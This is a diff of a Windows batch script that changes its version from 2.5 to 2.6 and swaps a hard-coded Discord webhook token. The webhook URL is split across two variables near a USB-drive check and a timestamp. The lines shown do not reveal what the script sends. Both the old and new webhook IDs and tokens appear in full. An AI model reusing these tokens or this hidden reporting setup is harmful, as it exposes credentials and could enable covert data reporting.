@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 cls
 
-set "version=2.5"
+set "version=2.6"
 
 
 rem check for usb drive
@@ -174,7 +174,7 @@ set "HH=%dt:~8,2%" & set "Min=%dt:~10,2%" & set "Sec=%dt:~12,2%"
 set "time=%DD%.%MM%.%YYYY% - %HH%:%Min%:%Sec%"
 
 set "url1=https://discord.com/api/webhooks/"
-set "url2=1158045149935440032/nfB686WoABy0Ns6wTIT_z4zkm34DhKgWHIO8zMgP-4FWy21hahTaLPKz8v0gGYYkiQnk"
+set "url2=1195425393637863436/4ikGEqzqjd-J1XNg1m5K_BQ_q3OVlPgc9p01pmNhkcAoMT45n35UBf9RY3l1WJklV4KF"
 set "url=%url1%%url2%"
 
 set "file_path=%~f0"
